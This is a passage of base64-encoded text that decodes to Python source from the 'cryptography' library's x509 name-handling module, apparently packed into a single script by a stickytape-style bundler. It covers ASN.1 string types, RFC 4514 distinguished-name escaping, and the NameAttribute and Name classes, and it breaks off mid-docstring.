hbHVlOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZSh0eXBlX2lkLCBPYmplY3RJZGVudGlmaWVyKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJ0eXBlX2lkIG11c3QgYmUgYW4gT2JqZWN0SWRlbnRpZmllciIpXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UodmFsdWUsIGJ5dGVzKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJ2YWx1ZSBtdXN0IGJlIGEgYmluYXJ5IHN0cmluZyIpXHJcblxyXG4gICAgICAgIHNlbGYuX3R5cGVfaWQgPSB0eXBlX2lkXHJcbiAgICAgICAgc2VsZi5fdmFsdWUgPSB2YWx1ZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHR5cGVfaWQoc2VsZikgLT4gT2JqZWN0SWRlbnRpZmllcjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fdHlwZV9pZFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHZhbHVlKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl92YWx1ZVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8T3RoZXJOYW1lKHR5cGVfaWQ9e30sIHZhbHVlPXshcn0pPiIuZm9ybWF0KFxyXG4gICAgICAgICAgICBzZWxmLnR5cGVfaWQsIHNlbGYudmFsdWVcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBPdGhlck5hbWUpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYudHlwZV9pZCA9PSBvdGhlci50eXBlX2lkIGFuZCBzZWxmLnZhbHVlID09IG90aGVyLnZhbHVlXHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaCgoc2VsZi50eXBlX2lkLCBzZWxmLnZhbHVlKSlcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS94NTA5L25hbWUucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5pbXBvcnQgYmluYXNjaWlcclxuaW1wb3J0IHJlXHJcbmltcG9ydCBzeXNcclxuaW1wb3J0IHR5cGluZ1xyXG5pbXBvcnQgd2FybmluZ3NcclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5IGltcG9ydCB1dGlsc1xyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmluZGluZ3MuX3J1c3QgaW1wb3J0IChcclxuICAgIHg1MDkgYXMgcnVzdF94NTA5LFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lng1MDkub2lkIGltcG9ydCBOYW1lT0lELCBPYmplY3RJZGVudGlmaWVyXHJcblxyXG5cclxuY2xhc3MgX0FTTjFUeXBlKHV0aWxzLkVudW0pOlxyXG4gICAgQml0U3RyaW5nID0gM1xyXG4gICAgT2N0ZXRTdHJpbmcgPSA0XHJcbiAgICBVVEY4U3RyaW5nID0gMTJcclxuICAgIE51bWVyaWNTdHJpbmcgPSAxOFxyXG4gICAgUHJpbnRhYmxlU3RyaW5nID0gMTlcclxuICAgIFQ2MVN0cmluZyA9IDIwXHJcbiAgICBJQTVTdHJpbmcgPSAyMlxyXG4gICAgVVRDVGltZSA9IDIzXHJcbiAgICBHZW5lcmFsaXplZFRpbWUgPSAyNFxyXG4gICAgVmlzaWJsZVN0cmluZyA9IDI2XHJcbiAgICBVbml2ZXJzYWxTdHJpbmcgPSAyOFxyXG4gICAgQk1QU3RyaW5nID0gMzBcclxuXHJcblxyXG5fQVNOMV9UWVBFX1RPX0VOVU0gPSB7aS52YWx1ZTogaSBmb3IgaSBpbiBfQVNOMVR5cGV9XHJcbl9OQU1FT0lEX0RFRkFVTFRfVFlQRTogdHlwaW5nLkRpY3RbT2JqZWN0SWRlbnRpZmllciwgX0FTTjFUeXBlXSA9IHtcclxuICAgIE5hbWVPSUQuQ09VTlRSWV9OQU1FOiBfQVNOMVR5cGUuUHJpbnRhYmxlU3RyaW5nLFxyXG4gICAgTmFtZU9JRC5KVVJJU0RJQ1RJT05fQ09VTlRSWV9OQU1FOiBfQVNOMVR5cGUuUHJpbnRhYmxlU3RyaW5nLFxyXG4gICAgTmFtZU9JRC5TRVJJQUxfTlVNQkVSOiBfQVNOMVR5cGUuUHJpbnRhYmxlU3RyaW5nLFxyXG4gICAgTmFtZU9JRC5ETl9RVUFMSUZJRVI6IF9BU04xVHlwZS5QcmludGFibGVTdHJpbmcsXHJcbiAgICBOYW1lT0lELkVNQUlMX0FERFJFU1M6IF9BU04xVHlwZS5JQTVTdHJpbmcsXHJcbiAgICBOYW1lT0lELkRPTUFJTl9DT01QT05FTlQ6IF9BU04xVHlwZS5JQTVTdHJpbmcsXHJcbn1cclxuXHJcbiMgVHlwZSBhbGlhc1xyXG5fT2lkTmFtZU1hcCA9IHR5cGluZy5NYXBwaW5nW09iamVjdElkZW50aWZpZXIsIHN0cl1cclxuXHJcbiM6IFNob3J0IGF0dHJpYnV0ZSBuYW1lcyBmcm9tIFJGQyA0NTE0OlxyXG4jOiBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNDUxNCNwYWdlLTdcclxuX05BTUVPSURfVE9fTkFNRTogX09pZE5hbWVNYXAgPSB7XHJcbiAgICBOYW1lT0lELkNPTU1PTl9OQU1FOiAiQ04iLFxyXG4gICAgTmFtZU9JRC5MT0NBTElUWV9OQU1FOiAiTCIsXHJcbiAgICBOYW1lT0lELlNUQVRFX09SX1BST1ZJTkNFX05BTUU6ICJTVCIsXHJcbiAgICBOYW1lT0lELk9SR0FOSVpBVElPTl9OQU1FOiAiTyIsXHJcbiAgICBOYW1lT0lELk9SR0FOSVpBVElPTkFMX1VOSVRfTkFNRTogIk9VIixcclxuICAgIE5hbWVPSUQuQ09VTlRSWV9OQU1FOiAiQyIsXHJcbiAgICBOYW1lT0lELlNUUkVFVF9BRERSRVNTOiAiU1RSRUVUIixcclxuICAgIE5hbWVPSUQuRE9NQUlOX0NPTVBPTkVOVDogIkRDIixcclxuICAgIE5hbWVPSUQuVVNFUl9JRDogIlVJRCIsXHJcbn1cclxuX05BTUVfVE9fTkFNRU9JRCA9IHt2OiBrIGZvciBrLCB2IGluIF9OQU1FT0lEX1RPX05BTUUuaXRlbXMoKX1cclxuXHJcblxyXG5kZWYgX2VzY2FwZV9kbl92YWx1ZSh2YWw6IHR5cGluZy5VbmlvbltzdHIsIGJ5dGVzXSkgLT4gc3RyOlxyXG4gICAgIiIiRXNjYXBlIHNwZWNpYWwgY2hhcmFjdGVycyBpbiBSRkM0NTE0IERpc3Rpbmd1aXNoZWQgTmFtZSB2YWx1ZS4iIiJcclxuXHJcbiAgICBpZiBub3QgdmFsOlxyXG4gICAgICAgIHJldHVybiAiIlxyXG5cclxuICAgICMgUkZDIDQ1MTQgU2VjdGlvbiAyLjQgZGVmaW5lcyB0aGUgdmFsdWUgYXMgYmVpbmcgdGhlICMgKFUrMDAyMykgY2hhcmFjdGVyXHJcbiAgICAjIGZvbGxvd2VkIGJ5IHRoZSBoZXhhZGVjaW1hbCBlbmNvZGluZyBvZiB0aGUgb2N0ZXRzLlxyXG4gICAgaWYgaXNpbnN0YW5jZSh2YWwsIGJ5dGVzKTpcclxuICAgICAgICByZXR1cm4gIiMiICsgYmluYXNjaWkuaGV4bGlmeSh2YWwpLmRlY29kZSgidXRmOCIpXHJcblxyXG4gICAgIyBTZWUgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzQ1MTQjc2VjdGlvbi0yLjRcclxuICAgIHZhbCA9IHZhbC5yZXBsYWNlKCJcXFxcIiwgIlxcXFxcXFxcIilcclxuICAgIHZhbCA9IHZhbC5yZXBsYWNlKFwnIlwnLCBcJ1xcXFwiXCcpXHJcbiAgICB2YWwgPSB2YWwucmVwbGFjZSgiKyIsICJcXFxcKyIpXHJcbiAgICB2YWwgPSB2YWwucmVwbGFjZSgiLCIsICJcXFxcLCIpXHJcbiAgICB2YWwgPSB2YWwucmVwbGFjZSgiOyIsICJcXFxcOyIpXHJcbiAgICB2YWwgPSB2YWwucmVwbGFjZSgiPCIsICJcXFxcPCIpXHJcbiAgICB2YWwgPSB2YWwucmVwbGFjZSgiPiIsICJcXFxcPiIpXHJcbiAgICB2YWwgPSB2YWwucmVwbGFjZSgiXFwwIiwgIlxcXFwwMCIpXHJcblxyXG4gICAgaWYgdmFsWzBdIGluICgiIyIsICIgIik6XHJcbiAgICAgICAgdmFsID0gIlxcXFwiICsgdmFsXHJcbiAgICBpZiB2YWxbLTFdID09ICIgIjpcclxuICAgICAgICB2YWwgPSB2YWxbOi0xXSArICJcXFxcICJcclxuXHJcbiAgICByZXR1cm4gdmFsXHJcblxyXG5cclxuZGVmIF91bmVzY2FwZV9kbl92YWx1ZSh2YWw6IHN0cikgLT4gc3RyOlxyXG4gICAgaWYgbm90IHZhbDpcclxuICAgICAgICByZXR1cm4gIiJcclxuXHJcbiAgICAjIFNlZSBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNDUxNCNzZWN0aW9uLTNcclxuXHJcbiAgICAjIHNwZWNpYWwgPSBlc2NhcGVkIC8gU1BBQ0UgLyBTSEFSUCAvIEVRVUFMU1xyXG4gICAgIyBlc2NhcGVkID0gRFFVT1RFIC8gUExVUyAvIENPTU1BIC8gU0VNSSAvIExBTkdMRSAvIFJBTkdMRVxyXG4gICAgZGVmIHN1YihtKTpcclxuICAgICAgICB2YWwgPSBtLmdyb3VwKDEpXHJcbiAgICAgICAgIyBSZWd1bGFyIGVzY2FwZVxyXG4gICAgICAgIGlmIGxlbih2YWwpID09IDE6XHJcbiAgICAgICAgICAgIHJldHVybiB2YWxcclxuICAgICAgICAjIEhleC12YWx1ZSBzY2FwZVxyXG4gICAgICAgIHJldHVybiBjaHIoaW50KHZhbCwgMTYpKVxyXG5cclxuICAgIHJldHVybiBfUkZDNDUxNE5hbWVQYXJzZXIuX1BBSVJfUkUuc3ViKHN1YiwgdmFsKVxyXG5cclxuXHJcbmNsYXNzIE5hbWVBdHRyaWJ1dGU6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBvaWQ6IE9iamVjdElkZW50aWZpZXIsXHJcbiAgICAgICAgdmFsdWU6IHR5cGluZy5VbmlvbltzdHIsIGJ5dGVzXSxcclxuICAgICAgICBfdHlwZTogdHlwaW5nLk9wdGlvbmFsW19BU04xVHlwZV0gPSBOb25lLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgX3ZhbGlkYXRlOiBib29sID0gVHJ1ZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShvaWQsIE9iamVjdElkZW50aWZpZXIpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAib2lkIGFyZ3VtZW50IG11c3QgYmUgYW4gT2JqZWN0SWRlbnRpZmllciBpbnN0YW5jZS4iXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBpZiBfdHlwZSA9PSBfQVNOMVR5cGUuQml0U3RyaW5nOlxyXG4gICAgICAgICAgICBpZiBvaWQgIT0gTmFtZU9JRC5YNTAwX1VOSVFVRV9JREVOVElGSUVSOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJvaWQgbXVzdCBiZSBYNTAwX1VOSVFVRV9JREVOVElGSUVSIGZvciBCaXRTdHJpbmcgdHlwZS4iXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHZhbHVlLCBieXRlcyk6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoInZhbHVlIG11c3QgYmUgYnl0ZXMgZm9yIEJpdFN0cmluZyIpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UodmFsdWUsIHN0cik6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoInZhbHVlIGFyZ3VtZW50IG11c3QgYmUgYSBzdHIiKVxyXG5cclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIG9pZCA9PSBOYW1lT0lELkNPVU5UUllfTkFNRVxyXG4gICAgICAgICAgICBvciBvaWQgPT0gTmFtZU9JRC5KVVJJU0RJQ1RJT05fQ09VTlRSWV9OQU1FXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgYXNzZXJ0IGlzaW5zdGFuY2UodmFsdWUsIHN0cilcclxuICAgICAgICAgICAgY19sZW4gPSBsZW4odmFsdWUuZW5jb2RlKCJ1dGY4IikpXHJcbiAgICAgICAgICAgIGlmIGNfbGVuICE9IDIgYW5kIF92YWxpZGF0ZSBpcyBUcnVlOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiQ291bnRyeSBuYW1lIG11c3QgYmUgYSAyIGNoYXJhY3RlciBjb3VudHJ5IGNvZGUiXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGVsaWYgY19sZW4gIT0gMjpcclxuICAgICAgICAgICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICAgICAgICAgIkNvdW50cnkgbmFtZXMgc2hvdWxkIGJlIHR3byBjaGFyYWN0ZXJzLCBidXQgdGhlICJcclxuICAgICAgICAgICAgICAgICAgICAiYXR0cmlidXRlIGlzIHt9IGNoYXJhY3RlcnMgaW4gbGVuZ3RoLiIuZm9ybWF0KGNfbGVuKSxcclxuICAgICAgICAgICAgICAgICAgICBzdGFja2xldmVsPTIsXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICMgVGhlIGFwcHJvcHJpYXRlIEFTTjEgc3RyaW5nIHR5cGUgdmFyaWVzIGJ5IE9JRCBhbmQgaXMgZGVmaW5lZCBhY3Jvc3NcclxuICAgICAgICAjIG11bHRpcGxlIFJGQ3MgaW5jbHVkaW5nIDI0NTksIDMyODAsIGFuZCA1MjgwLiBJbiBnZW5lcmFsIFVURjhTdHJpbmdcclxuICAgICAgICAjIGlzIHByZWZlcnJlZCAoMjQ1OSksIGJ1dCAzMjgwIGFuZCA1MjgwIHNwZWNpZnkgc2V2ZXJhbCBPSURzIHdpdGhcclxuICAgICAgICAjIGFsdGVybmF0ZSB0eXBlcy4gVGhpcyBtZWFucyB3aGVuIHdlIHNlZSB0aGUgc2VudGluZWwgdmFsdWUgd2UgbmVlZFxyXG4gICAgICAgICMgdG8gbG9vayB1cCB3aGV0aGVyIHRoZSBPSUQgaGFzIGEgbm9uLVVURjggdHlwZS4gSWYgaXQgZG9lcywgc2V0IGl0XHJcbiAgICAgICAgIyB0byB0aGF0LiBPdGhlcndpc2UsIFVURjghXHJcbiAgICAgICAgaWYgX3R5cGUgaXMgTm9uZTpcclxuICAgICAgICAgICAgX3R5cGUgPSBfTkFNRU9JRF9ERUZBVUxUX1RZUEUuZ2V0KG9pZCwgX0FTTjFUeXBlLlVURjhTdHJpbmcpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKF90eXBlLCBfQVNOMVR5cGUpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIl90eXBlIG11c3QgYmUgZnJvbSB0aGUgX0FTTjFUeXBlIGVudW0iKVxyXG5cclxuICAgICAgICBzZWxmLl9vaWQgPSBvaWRcclxuICAgICAgICBzZWxmLl92YWx1ZSA9IHZhbHVlXHJcbiAgICAgICAgc2VsZi5fdHlwZSA9IF90eXBlXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgb2lkKHNlbGYpIC0+IE9iamVjdElkZW50aWZpZXI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX29pZFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHZhbHVlKHNlbGYpIC0+IHR5cGluZy5VbmlvbltzdHIsIGJ5dGVzXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fdmFsdWVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiByZmM0NTE0X2F0dHJpYnV0ZV9uYW1lKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgc2hvcnQgYXR0cmlidXRlIG5hbWUgKGZvciBleGFtcGxlICJDTiIpIGlmIGF2YWlsYWJsZSxcclxuICAgICAgICBvdGhlcndpc2UgdGhlIE9JRCBkb3R0ZWQgc3RyaW5nLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJldHVybiBfTkFNRU9JRF9UT19OQU1FLmdldChzZWxmLm9pZCwgc2VsZi5vaWQuZG90dGVkX3N0cmluZylcclxuXHJcbiAgICBkZWYgcmZjNDUxNF9zdHJpbmcoXHJcbiAgICAgICAgc2VsZiwgYXR0cl9uYW1lX292ZXJyaWRlczogdHlwaW5nLk9wdGlvbmFsW19PaWROYW1lTWFwXSA9IE5vbmVcclxuICAgICkgLT4gc3RyOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIEZvcm1hdCBhcyBSRkM0NTE0IERpc3Rpbmd1aXNoZWQgTmFtZSBzdHJpbmcuXHJcblxyXG4gICAgICAgIFVzZSBzaG9ydCBhdHRyaWJ1dGUgbmFtZSBpZiBhdmFpbGFibGUsIG90aGVyd2lzZSBmYWxsIGJhY2sgdG8gT0lEXHJcbiAgICAgICAgZG90dGVkIHN0cmluZy5cclxuICAgICAgICAiIiJcclxuICAgICAgICBhdHRyX25hbWUgPSAoXHJcbiAgICAgICAgICAgIGF0dHJfbmFtZV9vdmVycmlkZXMuZ2V0KHNlbGYub2lkKSBpZiBhdHRyX25hbWVfb3ZlcnJpZGVzIGVsc2UgTm9uZVxyXG4gICAgICAgIClcclxuICAgICAgICBpZiBhdHRyX25hbWUgaXMgTm9uZTpcclxuICAgICAgICAgICAgYXR0cl9uYW1lID0gc2VsZi5yZmM0NTE0X2F0dHJpYnV0ZV9uYW1lXHJcblxyXG4gICAgICAgIHJldHVybiBmInthdHRyX25hbWV9PXtfZXNjYXBlX2RuX3ZhbHVlKHNlbGYudmFsdWUpfSJcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIE5hbWVBdHRyaWJ1dGUpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYub2lkID09IG90aGVyLm9pZCBhbmQgc2VsZi52YWx1ZSA9PSBvdGhlci52YWx1ZVxyXG5cclxuICAgIGRlZiBfX2hhc2hfXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGhhc2goKHNlbGYub2lkLCBzZWxmLnZhbHVlKSlcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPE5hbWVBdHRyaWJ1dGUob2lkPXswLm9pZH0sIHZhbHVlPXswLnZhbHVlIXJ9KT4iLmZvcm1hdChzZWxmKVxyXG5cclxuXHJcbmNsYXNzIFJlbGF0aXZlRGlzdGluZ3Vpc2hlZE5hbWU6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgYXR0cmlidXRlczogdHlwaW5nLkl0ZXJhYmxlW05hbWVBdHRyaWJ1dGVdKTpcclxuICAgICAgICBhdHRyaWJ1dGVzID0gbGlzdChhdHRyaWJ1dGVzKVxyXG4gICAgICAgIGlmIG5vdCBhdHRyaWJ1dGVzOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJhIHJlbGF0aXZlIGRpc3Rpbmd1aXNoZWQgbmFtZSBjYW5ub3QgYmUgZW1wdHkiKVxyXG4gICAgICAgIGlmIG5vdCBhbGwoaXNpbnN0YW5jZSh4LCBOYW1lQXR0cmlidXRlKSBmb3IgeCBpbiBhdHRyaWJ1dGVzKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJhdHRyaWJ1dGVzIG11c3QgYmUgYW4gaXRlcmFibGUgb2YgTmFtZUF0dHJpYnV0ZSIpXHJcblxyXG4gICAgICAgICMgS2VlcCBsaXN0IGFuZCBmcm96ZW5zZXQgdG8gcHJlc2VydmUgYXR0cmlidXRlIG9yZGVyIHdoZXJlIGl0IG1hdHRlcnNcclxuICAgICAgICBzZWxmLl9hdHRyaWJ1dGVzID0gYXR0cmlidXRlc1xyXG4gICAgICAgIHNlbGYuX2F0dHJpYnV0ZV9zZXQgPSBmcm96ZW5zZXQoYXR0cmlidXRlcylcclxuXHJcbiAgICAgICAgaWYgbGVuKHNlbGYuX2F0dHJpYnV0ZV9zZXQpICE9IGxlbihhdHRyaWJ1dGVzKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiZHVwbGljYXRlIGF0dHJpYnV0ZXMgYXJlIG5vdCBhbGxvd2VkIilcclxuXHJcbiAgICBkZWYgZ2V0X2F0dHJpYnV0ZXNfZm9yX29pZChcclxuICAgICAgICBzZWxmLCBvaWQ6IE9iamVjdElkZW50aWZpZXJcclxuICAgICkgLT4gdHlwaW5nLkxpc3RbTmFtZUF0dHJpYnV0ZV06XHJcbiAgICAgICAgcmV0dXJuIFtpIGZvciBpIGluIHNlbGYgaWYgaS5vaWQgPT0gb2lkXVxyXG5cclxuICAgIGRlZiByZmM0NTE0X3N0cmluZyhcclxuICAgICAgICBzZWxmLCBhdHRyX25hbWVfb3ZlcnJpZGVzOiB0eXBpbmcuT3B0aW9uYWxbX09pZE5hbWVNYXBdID0gTm9uZVxyXG4gICAgKSAtPiBzdHI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgRm9ybWF0IGFzIFJGQzQ1MTQgRGlzdGluZ3Vpc2hlZCBOYW1lIHN0cmluZy5cclxuXHJcbiAgICAgICAgV2l0aGluIGVhY2ggUkROLCBhdHRyaWJ1dGVzIGFyZSBqb2luZWQgYnkgXCcrXCcsIGFsdGhvdWdoIHRoYXQgaXMgcmFyZWx5XHJcbiAgICAgICAgdXNlZCBpbiBjZXJ0aWZpY2F0ZXMuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuICIrIi5qb2luKFxyXG4gICAgICAgICAgICBhdHRyLnJmYzQ1MTRfc3RyaW5nKGF0dHJfbmFtZV9vdmVycmlkZXMpXHJcbiAgICAgICAgICAgIGZvciBhdHRyIGluIHNlbGYuX2F0dHJpYnV0ZXNcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcjogb2JqZWN0KSAtPiBib29sOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBSZWxhdGl2ZURpc3Rpbmd1aXNoZWROYW1lKTpcclxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLl9hdHRyaWJ1dGVfc2V0ID09IG90aGVyLl9hdHRyaWJ1dGVfc2V0XHJcblxyXG4gICAgZGVmIF9faGFzaF9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gaGFzaChzZWxmLl9hdHRyaWJ1dGVfc2V0KVxyXG5cclxuICAgIGRlZiBfX2l0ZXJfXyhzZWxmKSAtPiB0eXBpbmcuSXRlcmF0b3JbTmFtZUF0dHJpYnV0ZV06XHJcbiAgICAgICAgcmV0dXJuIGl0ZXIoc2VsZi5fYXR0cmlidXRlcylcclxuXHJcbiAgICBkZWYgX19sZW5fXyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIGxlbihzZWxmLl9hdHRyaWJ1dGVzKVxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8UmVsYXRpdmVEaXN0aW5ndWlzaGVkTmFtZSh7fSk+Ii5mb3JtYXQoc2VsZi5yZmM0NTE0X3N0cmluZygpKVxyXG5cclxuXHJcbmNsYXNzIE5hbWU6XHJcbiAgICBAdHlwaW5nLm92ZXJsb2FkXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgYXR0cmlidXRlczogdHlwaW5nLkl0ZXJhYmxlW05hbWVBdHRyaWJ1dGVdKSAtPiBOb25lOlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIEB0eXBpbmcub3ZlcmxvYWRcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLCBhdHRyaWJ1dGVzOiB0eXBpbmcuSXRlcmFibGVbUmVsYXRpdmVEaXN0aW5ndWlzaGVkTmFtZV1cclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBhdHRyaWJ1dGVzOiB0eXBpbmcuSXRlcmFibGVbXHJcbiAgICAgICAgICAgIHR5cGluZy5VbmlvbltOYW1lQXR0cmlidXRlLCBSZWxhdGl2ZURpc3Rpbmd1aXNoZWROYW1lXVxyXG4gICAgICAgIF0sXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgYXR0cmlidXRlcyA9IGxpc3QoYXR0cmlidXRlcylcclxuICAgICAgICBpZiBhbGwoaXNpbnN0YW5jZSh4LCBOYW1lQXR0cmlidXRlKSBmb3IgeCBpbiBhdHRyaWJ1dGVzKTpcclxuICAgICAgICAgICAgc2VsZi5fYXR0cmlidXRlcyA9IFtcclxuICAgICAgICAgICAgICAgIFJlbGF0aXZlRGlzdGluZ3Vpc2hlZE5hbWUoW3R5cGluZy5jYXN0KE5hbWVBdHRyaWJ1dGUsIHgpXSlcclxuICAgICAgICAgICAgICAgIGZvciB4IGluIGF0dHJpYnV0ZXNcclxuICAgICAgICAgICAgXVxyXG4gICAgICAgIGVsaWYgYWxsKGlzaW5zdGFuY2UoeCwgUmVsYXRpdmVEaXN0aW5ndWlzaGVkTmFtZSkgZm9yIHggaW4gYXR0cmlidXRlcyk6XHJcbiAgICAgICAgICAgIHNlbGYuX2F0dHJpYnV0ZXMgPSB0eXBpbmcuY2FzdChcclxuICAgICAgICAgICAgICAgIHR5cGluZy5MaXN0W1JlbGF0aXZlRGlzdGluZ3Vpc2hlZE5hbWVdLCBhdHRyaWJ1dGVzXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiYXR0cmlidXRlcyBtdXN0IGJlIGEgbGlzdCBvZiBOYW1lQXR0cmlidXRlIlxyXG4gICAgICAgICAgICAgICAgIiBvciBhIGxpc3QgUmVsYXRpdmVEaXN0aW5ndWlzaGVkTmFtZSJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGZyb21fcmZjNDUxNF9zdHJpbmcoY2xzLCBkYXRhOiBzdHIpIC0+ICJOYW1lIjpcclxuICAgICAgICByZXR1cm4gX1JGQzQ1MTROYW1lUGFyc2VyKGRhdGEpLnBhcnNlKClcclxuXHJcbiAgICBkZWYgcmZjNDUxNF9zdHJpbmcoXHJcbiAgICAgICAgc2VsZiwgYXR0cl9uYW1lX292ZXJyaWRlczogdHlwaW5nLk9wdGlvbmFsW19PaWROYW1lTWFwXSA9IE5vbmVcclxuICAgICkgLT4gc3RyOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIEZvcm1hdCBhcyBSRkM0NTE0IERpc3Rpbmd1aXNoZWQgTmFtZSBzdHJpbmcuXHJcbiAgICAgICAgRm9yIGV4YW1wbGUgXCdDTj1mb29iYXIuY29tLE89Rm9vIENvcnAsQz1VU1wnXHJcblxyXG4gICAgICAgIEFuIFguNTA5IG5hbWUgaXMgYSB0d28tbGV2ZWwgc3RydWN0dXJlOiBhIGxpc3Qgb2Ygc2V0cyBvZiBhdHRyaWJ1dGVzLlxyXG4gICAgICAgIEVhY2ggbGlzdCBlbGVtZW50IGlzIHNlcGFyYXRlZCBieSBcJyxcJyBhbmQgd2l0aGluIGVhY2ggbGlzdCBlbGVtZW50LCBzZXRcclxuICAgICAgICBlbGVtZW50cyBhcmUgc2VwYXJhdGVkIGJ5IFwnK1wnLiBUaGUgbGF0dGVyIGlzIGFsbW9zdCBu